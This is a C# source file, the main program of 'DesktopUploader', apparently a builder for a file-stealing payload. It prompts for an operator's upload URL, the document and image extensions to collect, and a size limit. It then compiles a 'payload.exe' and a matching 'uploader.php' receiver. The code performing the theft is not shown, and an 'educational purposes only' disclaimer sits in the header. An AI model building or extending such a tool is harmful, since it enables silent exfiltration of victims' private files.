using System;

/* 
       │ Author       : NYAN CAT
       │ Name         : DesktopUploader v0.1
       │ Contact Me   : GitHub.com/NYAN-x-CAT

       This program is distributed for educational purposes only.

*/

namespace DesktopUploader
{
    public class Program
    {
        public static void Main()
        {
            ConsoleHelper.Banner();
            ConsoleHelper.Info();

            //ask user to enter uploader settings
            UploaderSettings uploaderSettings = CreateNewUploader();

            //show settings in green font
            CurrentSettings(uploaderSettings);

            //use codedom to compile
            Compile(uploaderSettings);

            Console.Write("\nDone!\nPress any key to exit...");
            Console.ReadKey();
        }

        private static UploaderSettings CreateNewUploader()
        {
            UploaderSettings uploaderSettings = new UploaderSettings();

            try
            {
                //URL
                Console.WriteLine("[+]Uploader Path: [default http://127.0.0.1/uploader.php]");
                string url = Console.ReadLine();
                if (!string.IsNullOrWhiteSpace(url))
                    uploaderSettings.Url = url;
                else
                {
                    ConsoleHelper.DeletePrevConsoleLine();
                    Console.WriteLine(uploaderSettings.Url);
                }
                Console.WriteLine();

                //Extensions
                Console.WriteLine("[+]Extensions: [default .jpeg .jpg .txt .doc .docx]");
                string extensions = Console.ReadLine();
                if (!string.IsNullOrWhiteSpace(extensions))
                {
                    uploaderSettings.Extensions.Clear();
                    foreach (string extension in extensions.Split(new[] { " ." }, StringSplitOptions.None))
                    {
                        uploaderSettings.Extensions.Add(extension);
                    }
                }
                else
                {
                    ConsoleHelper.DeletePrevConsoleLine();
                    Console.WriteLine(".jpeg .jpg .txt .doc .docx");
                }
                Console.WriteLine();

                //Size Limit
                Console.WriteLine("[+]Max File Size in KB: [default 500]");
                string size = Console.ReadLine();
                if (!string.IsNullOrWhiteSpace(size))
                    uploaderSettings.SizeLimit = Convert.ToInt32(size);
                else
                {
                    ConsoleHelper.DeletePrevConsoleLine();
                    Console.WriteLine("500");
                }
                Console.WriteLine();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine(ex.Message);
                Console.ReadKey();
                Environment.Exit(0);
            }

            return uploaderSettings;
        }

        //Preview Settings
        private static void CurrentSettings(UploaderSettings uploaderSettings)
        {
            Console.Clear();
            ConsoleHelper.Banner();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("\n[!]Current Settings:");
            Console.WriteLine($"Url: {uploaderSettings.Url}");
            Console.Write("Extensions:");
            uploaderSettings.Extensions.ForEach(foo => Console.Write($" {foo}"));
            Console.WriteLine($"\nMax size: {uploaderSettings.SizeLimit / 1024}KB");
            Console.ResetColor();
        }

        //codedom to compile
        private static void Compile(UploaderSettings uploaderSettings)
        {
            try
            {
                new Compiler(uploaderSettings);

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"\nCreated: payload.exe");
                Console.WriteLine($"Created: uploader.php");
                Console.ResetColor();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine(ex.Message);
                Console.ReadKey();
                Environment.Exit(0);
            }
        }
    }
}
